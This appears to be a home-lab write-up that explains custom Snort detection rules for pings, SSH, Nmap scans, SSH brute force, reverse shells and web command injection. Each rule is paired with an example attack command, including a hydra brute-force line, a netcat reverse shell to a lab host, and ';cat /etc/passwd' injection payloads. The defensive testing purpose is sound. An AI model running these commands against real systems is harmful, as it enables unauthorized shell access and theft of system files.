# Snort Rules Explained

This document explains the purpose, behaviour, and testing methodology of the custom Snort rules developed for the home lab environment.

---

# ICMP Detection

```snort
alert icmp any any -> $HOME_NET any (msg:"Ping detected";sid:1000001;rev:1;)
```

## Purpose
Detect ICMP ping traffic entering the protected network.

## Detection Logic
- Detects all ICMP traffic
- Generates alert whenever ping activity occurs

## Example Attack

```bash
ping 172.30.2.102
```

---

# SSH Detection

```snort      
alert tcp any any -> $HOME_NET 22 (msg:"SSH detected";sid:1000002;rev:1;)
```

## Purpose
Detect SSH connection attempts to systems inside the protected network.

## Example Attack

```bash
ssh msfadmin@172.30.2.102
```

---

# Nmap SYN Scan Detection

```snort
alert tcp any any -> $HOME_NET any (msg:"Nmap SYN Scan Detected";flags:S;threshold:type both, track by_src, count 20, seconds 10;sid:1000003;rev:1;)
```

## Purpose
Detect SYN scan activity commonly generated by Nmap.

## Detection Logic
- Detects TCP SYN packets
- Requires:
  - 20 packets
  - Within 10 seconds
  - From same source IP

## TCP Flag
- `S` = SYN

## Example Attack

```bash
nmap -sS 172.30.2.102
```

---

# Nmap Xmas Scan Detection

```snort
alert tcp any any -> $HOME_NET any (msg:"Nmap Xmas Scan Detected";flags:FPU;sid:1000004;rev:1;)
```

## Purpose
Detect stealth TCP Xmas scans.

## TCP Flags
- `F` = FIN
- `P` = PSH
- `U` = URG

## Example Attack

```bash
nmap -sX 172.30.2.102
```

# SSH Brute Force Detection

```snort
alert tcp any any -> $HOME_NET 22 (msg:"Potential SSH Brute Force";flow:to_server,established;threshold:type both, track by_src, count 5, seconds 60;sid:1000005;rev:1;)
```

## Purpose
Detect repeated SSH login attempts indicative of brute force attacks.

## Detection Logic
- Traffic flowing to server
- Established TCP session
- More than 5 attempts within 60 seconds

## Example Attack

```bash
hydra -l msfadmin -P passwords.txt ssh://172.30.2.102
```

# Reverse Shell Detection

```snort
alert tcp $HOME_NET any -> any 4444 (msg:"Possible Reverse Shell";flow:to_server,established;sid:1000007;rev:1;)
```

## Purpose
Detect outbound connections to TCP port 4444, commonly used by reverse shells and Metasploit payloads.

## Detection Logic
- Internal machine making outbound connection
- Destination port 4444

## Example Attack

### Kali Listener

```bash
nc -lvnp 4444
```

### Reverse Shell

```bash
nc 172.30.1.20 4444 -e /bin/bash
```

# Web Exploit Command Injection Detection

```snort
alert tcp any any -> $HOME_NET 80 (msg:"Possible Command Injection Attempt";content:"cat";http_uri;sid:1000008;rev:1;)
```

## Purpose
Detect suspicious HTTP requests containing the `cat` command.

## Detection Logic
- HTTP traffic to web server
- Searches URI for:
  ```text
  cat
  ```

## Example Attack

```text
http://victim.com/ping.php?ip=8.8.8.8;cat /etc/passwd
```

## Lab Testing

DVWA Command Injection module was used for testing.

Example payload:

```text
127.0.0.1; cat /etc/passwd
```
